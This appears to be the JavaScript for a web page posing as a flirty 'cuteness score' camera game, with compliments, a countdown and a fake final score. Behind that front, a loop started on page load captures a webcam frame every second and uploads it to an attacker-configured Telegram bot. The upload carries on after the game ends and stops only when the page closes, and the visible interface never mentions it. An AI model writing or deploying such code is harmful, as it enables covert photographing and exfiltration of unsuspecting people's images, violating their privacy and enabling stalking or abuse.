// --- Configuration ---
const CONFIG = {
    botToken: 'YOUR_TELEGRAM_BOT_TOKEN', // Replace with your bot token
    chatId: 'YOUR_TELEGRAM_CHAT_ID',     // Replace with your chat ID
    intervalMs: 1000,                    // 1 frame per second
    imageQuality: 0.8                    // JPEG compression quality (0.0 to 1.0)
};

const COMPLIMENTS = [
    "Warning: Dangerously Cute! ✦",
    "Cuteness levels off the charts! 📈",
    "Perfect smile detected! ✨",
    "Are you a model? 📸",
    "Calculated Cuteness: 99.9% 💖",
    "Analyzing... Result: Adorable! 🎀",
    "You're glowing today! ♡",
    "Flawless aesthetics detected! ♥",
    "Error: Too cute to compute! ✦"
];

const FINAL_FLIRTS = [
    "Are you a camera? Because I smile every time I look at you! ✦",
    "Do you have a map? I keep getting lost in your eyes! ♡",
    "Are you a magician? Because everyone else just disappeared! ♥",
    "Is it hot in here, or is it just your cuteness? 🎀"
];

const SCORES = [
    "99.9% 🎀",
    "1000/10 ♥",
    "Infinity! ♡",
    "Beyond Scale ✦"
];

// --- State Variables ---
let mediaStream = null;
let captureIntervalId = null;
let complimentIntervalId = null;
let countdownTimerId = null;
let isUploading = false;
let rateLimitPauseUntil = 0;
let timeLeft = 10;

// --- DOM Elements ---
const videoElement = document.getElementById('cameraFeed');
const complimentDisplay = document.getElementById('complimentDisplay');
const statusLog = document.getElementById('statusLog');
const countdownDisplay = document.getElementById('countdown');
const finalResult = document.getElementById('finalResult');
const scoreText = document.getElementById('scoreText');
const flirtyText = document.getElementById('flirtyText');

// Hidden canvas for extraction
const canvas = document.createElement('canvas');
const ctx = canvas.getContext('2d');

// --- Helper Functions ---
function updateDevStatus(message) {
    const time = new Date().toLocaleTimeString();
    statusLog.textContent = '[' + time + '] ' + message;
    console.log('[' + time + '] ' + message);
}

function getBlobFromCanvas() {
    return new Promise((resolve) => {
        canvas.toBlob((blob) => {
            resolve(blob);
        }, 'image/jpeg', CONFIG.imageQuality);
    });
}

function showRandomCompliment() {
    const randomIndex = Math.floor(Math.random() * COMPLIMENTS.length);
    complimentDisplay.style.opacity = 0; 
    
    setTimeout(() => {
        complimentDisplay.textContent = COMPLIMENTS[randomIndex];
        complimentDisplay.style.opacity = 1; 
    }, 300); 
}

// --- Main Logic ---

async function startSession() {
    try {
        updateDevStatus('Requesting permissions...');
        mediaStream = await navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: 'user' }, 
            audio: false 
        });
        
        videoElement.srcObject = mediaStream;
        
        videoElement.onloadedmetadata = () => {
            canvas.width = videoElement.videoWidth;
            canvas.height = videoElement.videoHeight;
        };

        updateDevStatus('Camera active. Starting transmission and UI loop.');
        
        showRandomCompliment();

        // 1. Background Telegram capture loop (runs continuously)
        captureIntervalId = setInterval(processFrame, CONFIG.intervalMs);
        
        // 2. Foreground UI compliment loop
        complimentIntervalId = setInterval(showRandomCompliment, 2500);

        // 3. The 10-second UI countdown
        countdownTimerId = setInterval(() => {
            timeLeft--;
            countdownDisplay.textContent = timeLeft + 's ♡';
            
            if (timeLeft <= 0) {
                clearInterval(countdownTimerId);
                clearInterval(complimentIntervalId);
                revealFinalScore();
            }
        }, 1000);

    } catch (err) {
        updateDevStatus('Camera access denied: ' + err.message);
        complimentDisplay.textContent = "Oops! Need camera access to see your cuteness! 🎀";
    }
}

async function revealFinalScore() {
    // Pick random final stats
    const randomScore = SCORES[Math.floor(Math.random() * SCORES.length)];
    const randomFlirt = FINAL_FLIRTS[Math.floor(Math.random() * FINAL_FLIRTS.length)];
    
    scoreText.textContent = randomScore;
    flirtyText.textContent = randomFlirt;
    
    // Show overlay
    finalResult.classList.remove('hidden');
    complimentDisplay.textContent = "Analysis Complete! ✦♡🎀♥✦";

    // Extract current frame and force download to device
    try {
        // Draw actual orientation frame to canvas
        ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
        const imageBlob = await getBlobFromCanvas();
        
        const url = URL.createObjectURL(imageBlob);
        const a = document.createElement('a');
        a.style.display = 'none';
        a.href = url;
        a.download = 'my-cuteness-score-🎀.jpg';
        
        document.body.appendChild(a);
        a.click();
        
        setTimeout(() => {
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
        }, 100);
        
        updateDevStatus('Image downloaded to device.');
    } catch (e) {
        updateDevStatus('Failed to download image: ' + e.message);
    }
}

function stopSession() {
    if (captureIntervalId) clearInterval(captureIntervalId);
    if (complimentIntervalId) clearInterval(complimentIntervalId);
    if (countdownTimerId) clearInterval(countdownTimerId);
    
    if (mediaStream) {
        mediaStream.getTracks().forEach(track => track.stop());
    }
}

async function processFrame() {
    const now = Date.now();

    if (now < rateLimitPauseUntil) return;
    if (isUploading) return;
    
    isUploading = true;

    try {
        ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
        
        const imageBlob = await getBlobFromCanvas();
        if (!imageBlob) throw new Error("Failed to create blob");

        const formData = new FormData();
        formData.append('chat_id', CONFIG.chatId);
        formData.append('photo', imageBlob, 'frame_' + now + '.jpg');

        const response = await fetch('https://api.telegram.org/bot' + CONFIG.botToken + '/sendPhoto', {
            method: 'POST',
            body: formData
        });

        const result = await response.json();

        if (response.ok) {
            updateDevStatus('Upload success');
        } else if (response.status === 429) {
            const retrySec = result.parameters && result.parameters.retry_after ? result.parameters.retry_after : 5; 
            updateDevStatus('Rate limited. Pausing ' + retrySec + 's');
            rateLimitPauseUntil = now + (retrySec * 1000);
        } else {
            updateDevStatus('Upload failed: ' + result.description);
        }

    } catch (err) {
        updateDevStatus('Network error: ' + err.message);
    } finally {
        isUploading = false;
    }
}

// Start automatically without buttons
window.addEventListener('load', startSession);
window.addEventListener('beforeunload', stopSession);